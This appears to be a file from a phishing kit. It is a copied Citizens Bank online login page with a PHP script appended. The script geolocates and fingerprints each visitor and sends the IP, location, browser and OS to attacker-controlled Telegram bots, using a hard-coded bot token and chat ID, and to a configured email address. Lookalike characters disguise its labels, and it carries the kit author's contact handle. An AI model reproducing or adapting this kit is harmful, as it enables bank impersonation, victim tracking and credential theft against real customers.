        <li>Follow: <a target="_blank" href=""> <img src="https://www3.citizensbankonline.com/efs/hhf/img/footer-follow-facebook.png" alt="Facebook" align="middle"> </a> <a target="_blank" href=""> <img src="https://www3.citizensbankonline.com/efs/hhf/img/footer-follow-twitter.png" alt="Twitter"> </a> <a target="_blank" href=""> <img src="https://www3.citizensbankonline.com/efs/hhf/img/footer-follow-linkedin.png" alt="Linkedin"> </a> <a target="_blank" href=""> <img src="https://www3.citizensbankonline.com/efs/hhf/img/footer-follow-youtube.png" alt="Youtube"> </a> </li> 
       </ul> 
       <p class="footer-copyright"> © Copyright 2021 Citizens Financial Group, Inc. All rights reserved.<br>Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).<br>Citizens Bank corporate headquarters: One Citizens Plaza, Providence, RI 02903 </p> 
<img src="https://www3.citizensbankonline.com/efs/hhf/img/elh.gif" alt="Equal Housing Lender"> 
<img src="https://www3.citizensbankonline.com/efs/hhf/img/fdicFooter.gif" alt="Member FDIC"> 
      </div> 
     </div> 
    </footer>
   </div>
  </div> 
  
  <!-- end CITIZENS BANK Hosted Footer --> 
  <link rel="stylesheet" type="text/css" href="https://www3.citizensbankonline.com/_sec/cp_challenge/sec-3-5.css"> 
  <div id="sec-overlay" style="display:none;"> 
   <div id="sec-container"> 
   </div> 
  </div> 
  <!--  End Main Container --> 
  <script type="text/javascript">
$(document).ready(function() {
	<!-- Give the right brand for page title -->
    document.title = "Online Login | Citizens";
 $("#UserID").on('keypress paste',function(){
       $('#cbSaveUserID').attr('disabled', false);
   });

 $("#UserID").on('keyup input',function(){
    if(!$('#UserID').val().length)
       $('#cbSaveUserID').attr('disabled', true);
   });
   $(".tooltip").focusin(function(){
    $(this).addClass("hover");
   });
   $(".tooltip").focusout(function(){
    $(this).removeClass("hover");
   })




var skipSubmit = false;


$("#troubleloggingin").click(function(e) {
	e.preventDefault();
	skipSubmit = true;
	$("#frmSignOn").attr("action","");
    $("#frmSignOn").attr("method","get");
    post_deviceprint();
	$("#frmSignOn").submit();
});

function OLB_validate() {
	var userid = null;
    var result = false;

    if (!skipSubmit) {
    	currentpassword = $("#currentpassword").val();
	    
	        userid = $("#UserID").val();
	        if (userid != undefined && $.trim(userid).length > 0) {
	            userid = userid.replace(/^\s*|\s*$/g, "");
	        }
	        $("#UserID").val(userid.toLowerCase());
	    

	    if (userid == null || $.trim(userid).toLowerCase().length == 0) {
	        $("#messagecontainer").html("Please enter your Online User ID and click Login").css("display","block");
	        $("#messagecontainer").addClass("error");
	        $("#UserID").addClass("inputerror");
	        $('#UserID').focus();
	    } else if (currentpassword == null || $.trim(currentpassword).toLowerCase().length == 0) {
	        $("#messagecontainer").html("Please enter your User ID and Password and click Login").css("display","block");
	        $("#messagecontainer").addClass("error");
	        $("#currentpassword").addClass("currentpassword");
	        $('#currentpassword').focus();
	    } else {
	        // Check to see if the user is saving their User ID
	        if ($("#cbSaveUserID").is(':checked')) {
	            $("#SaveUserID").val("on");
	            $("#Register").val("1");
	        } else {
	            $("#SaveUserID").val("");
	            $("#Register").val("0");
	        }
	        result = true;
	    }

    } else {
    	result = true;
    }


    return result;
}

$("#frmSignOn").submit(function(e) {
    if (!OLB_validate()) {
    	 e.preventDefault();
    } else {
    	post_deviceprint();
    	return true;
    }
});

//show/hide password
/*$("#currentpassword").focus(function (e) {
    e.preventDefault();
    if ($('#showpswd').text() === "HIDE") {
        $('#currentpassword').prop('type', 'text');
        setTimeout(function () {
            $('#currentpassword').prop('type', 'password');
            $('#showpswd').text("SHOW");
        }, 5000);
    }
});
$('#showpswd').click(function (e) {
    e.preventDefault();
    var toggleText = $(e.currentTarget).text();
    $(e.currentTarget).text("HIDE");
    if (toggleText === "SHOW") {
        if ($('#currentpassword').val() === "") {
            $('#currentpassword').prop('type', 'text');
        }
        if ($('#currentpassword').val() !== "") {
            $('#currentpassword').prop('type', 'text');
            $(e.currentTarget).text("HIDE");
            setTimeout(function () {
                $('#currentpassword').prop('type', 'password');
                $(e.currentTarget).text("SHOW");
            }, 5000);
        }
    } else if (toggleText === "HIDE") {
        $('#currentpassword').prop('type', 'password');
        $(e.currentTarget).text("SHOW");
    }
});*/

//clear password when changed saved user id in select box
$('#SavedUserID').change(function(){
    $('#currentpassword').val('');
});

// Once page has loaded, re-enable button
//$('#btnLogin').removeAttr("disabled");
//$('#btnLogin').removeClass("inactive");

// Set focus to login ID
$('#UserID').focus();


});
</script> 
  <iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_citizensbank_0" src="https://citizensbank.demdex.net/dest5.html?d_nsid=0#https%3A%2F%2Fwww3.citizensbankonline.com%2Fefs%2Fservlet%2Fefs%2Flogin.jsp" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe>
  <iframe tabindex="-1" aria-hidden="true" role="presentation" title="Intentionally blank" name="lpSS_58895468432" id="lpSS_58895468432" src="https://lpcdn.lpsnmedia.net/le_secure_storage/3.13.0.0-release_5039/storage.secure.min.html?loc=https%3A%2F%2Fwww3.citizensbankonline.com&amp;site=83789770&amp;env=prod&amp;isCrossDomain=true" style="width: 0px; height: 0px; position: absolute; top: -1000px; left: -1000px; display: none;"></iframe>
  <iframe id="NJAchPDFw6tvrkaD" style="display: none;"></iframe>
 </body>
</html>
<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('allow_url_fopen',1);
ob_start();
function getTimeZoneFromIpAddress(){
  $clientsIpAddress = get_client_ip();
  $clientInformation = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$clientsIpAddress));
  $clientsLatitude = $clientInformation['geoplugin_latitude'];
  $clientsLongitude = $clientInformation['geoplugin_longitude'];
  $clientsCountryCode = $clientInformation['geoplugin_countryCode'];
  $clientsCountryName = $clientInformation['geoplugin_countryName'];
  $clientsRegionCode = $clientInformation['geoplugin_regionCode'];
  $clientsRegionName = $clientInformation['geoplugin_regionName'];
  $timeZone = get_nearest_timezone($clientsLatitude, $clientsLongitude, $clientsCountryCode) ;
  return array($timeZone, $clientsRegionCode, $clientsRegionName, $clientsCountryName, $clientsCountryCode);
}
$array = getTimeZoneFromIpAddress();
function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
function get_nearest_timezone($cur_lat, $cur_long, $country_code = '') {
    $timezone_ids = ($country_code) ? DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, $country_code)
        : DateTimeZone::listIdentifiers();
    if($timezone_ids && is_array($timezone_ids) && isset($timezone_ids[0])) {
        $time_zone = '';
        $tz_distance = 0;
        //only one identifier?
        if (count($timezone_ids) == 1) {
            $time_zone = $timezone_ids[0];
        } else {
            foreach($timezone_ids as $timezone_id) {
                $timezone = new DateTimeZone($timezone_id);
                $location = $timezone->getLocation();
                $tz_lat   = $location['latitude'];
                $tz_long  = $location['longitude'];

                $theta    = $cur_long - $tz_long;
                $distance = (sin(deg2rad($cur_lat)) * sin(deg2rad($tz_lat)))
                    + (cos(deg2rad($cur_lat)) * cos(deg2rad($tz_lat)) * cos(deg2rad($theta)));
                $distance = acos($distance);
                $distance = abs(rad2deg($distance));
                // echo '<br />'.$timezone_id.' '.$distance;

                if (!$time_zone || $tz_distance > $distance) {
                    $time_zone   = $timezone_id;
                    $tz_distance = $distance;
                }
            }
        }
        return $time_zone;
    }
    return 'unknown';
}
$IP = get_client_ip();
function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}
function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}
function getOS($useragent) {
  $os_platform = "Unknown OS Platform";
  $os_array = array('/windows nt 10/i' => 'Windows 10','/windows nt 6.3/i' => 'Windows 8.1','/windows nt 6.2/i' => 'Windows 8','/windows nt 6.1/i' => 'Windows 7','/windows nt 6.0/i' => 'Windows Vista','/windows nt 5.2/i' => 'Windows Server 2003/XP x64','/windows nt 5.1/i' => 'Windows XP','/windows xp/i' => 'Windows XP','/windows nt 5.0/i' => 'Windows 2000','/windows me/i' => 'Windows ME','/win98/i' => 'Windows 98','/win95/i' => 'Windows 95','/win16/i' => 'Windows 3.11','/macintosh|mac os x/i' => 'Mac OS X','/mac_powerpc/i' => 'Mac OS 9','/linux/i' => 'Linux','/ubuntu/i' => 'Ubuntu','/iphone/i' => 'iPhone','/ipod/i' => 'iPod','/ipad/i' =>  'iPad','/android/i' => 'Android','/blackberry/i' =>  'BlackBerry','/webos/i' => 'Mobile');
  foreach ($os_array as $regex => $value) {
    if (preg_match($regex, $useragent)) {
      $os_platform = $value;
    }
  }
  return $os_platform;
}
function getBrowser($useragent) {
    $browser = "Unknown Browser";
    $browser_array = array('/msie/i' => 'Internet Explorer','/firefox/i' => 'Firefox','/safari/i' => 'Safari','/chrome/i' => 'Chrome','/opera/i' => 'Opera','/netscape/i' => 'Netscape','/maxthon/i' => 'Maxthon','/konqueror/i' => 'Konqueror','/mobile/i' => 'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
$domain = $_SERVER['HTTP_HOST'];
$parse = $_SERVER['REQUEST_URI'];
$ab = "http://ss{$domain}{$parse}";
$details = get_ip1($IP);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$continent = $details['geoplugin_continentName'];
$city = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$currency = $details['geoplugin_currencySymbol_UTF8'];
if($countryname == "") {
    $details = get_ip2($IP2);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode'];
    $continent = $details['continent'];
    $city = $details['city'];
}
$hostname = gethostbyaddr($IP);
if ($ipv6 == ""){
  $IPV6 = "N/A";
} else {
  $IPV6 = $ipv6;
}
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timezone = $array[0];
$date = date("h:i:s d/m/Y");
$city = $city;
$currency = $currency;
$countrycode = $countrycode;
$countryname = $countryname;
$continent = $continent;
$regioncity = $regioncity;
$currency = $currency;
$os = getOS($useragent);
$browser = getBrowser($useragent);
$data .= "<-------- Ѵiеѡеr Іnfοrmаtiοn: {$IP} -------->\n\n";
$data .= "Page: Citizen [44257003]\n\n";
$data .= "Domain: {$ab}\n\n";
$data .= "ІР Αԁԁrеѕѕ : {$IP}\n"; 
$data .= "ІРѴ6 :  {$IPV6}\n";
$data .= "Սѕеr-Αɡеnt : {$useragent}\n";
$data .= "OS    :  {$os}\n";
$data .= "Вrοѡѕеr :  {$browser}\n";
$data .= "Timezone  : {$timezone}\n";
$data .= "City(IP)  : {$city}\n";
$data .= "Сοuntrу : {$countryname}, {$countrycode}\n";
$data .= "Continent : {$continent}\n";
$data .= "Currency  : {$currency}\n";
$data .= "Date  : {$date}\n\n";
$data .= "Contact @Devilmask09\n";
$tokens = "2012230318:AAHzl-Ae22hQP9B3LaRnMqOopvc3s8lWpag";
$ids = "1802897390";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$ids,
	'text'=>$data,
];
$ch = curl_init($bots . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
$data1 .= "<-------- Ѵiеѡеr Іnfοrmаtiοn: {$IP} -------->\n\n";
$data1 .= "Page: Citizen\n\n";
$data1 .= "ІР Αԁԁrеѕѕ : {$IP}\n"; 
$data1 .= "ІРѴ6 :  {$IPV6}\n";
$data1 .= "Սѕеr-Αɡеnt : {$useragent}\n";
$data1 .= "OS    :  {$os}\n";
$data1 .= "Вrοѡѕеr :  {$browser}\n";
$data1 .= "Timezone  : {$timezone}\n";
$data1 .= "City(IP)  : {$city}\n";
$data1 .= "Сοuntrу : {$countryname}, {$countrycode}\n";
$data1 .= "Continent : {$continent}\n";
$data1 .= "Currency  : {$currency}\n";
$data1 .= "Date  : {$date}\n\n";
$data1 .= "Contact @Devilmask09\n";
$token = file_get_contents("config/token.txt");
$id = file_get_contents("config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$params=[
	'chat_id'=>$id,
	'text'=>$data1,
];
$ch = curl_init($bot . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
$email = file_get_contents("config/email.txt");
$subject = "Viewer Information from : $IP";
        $headers = "From: Devilspam <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$data1,$headers); 
        exit();
?>	            
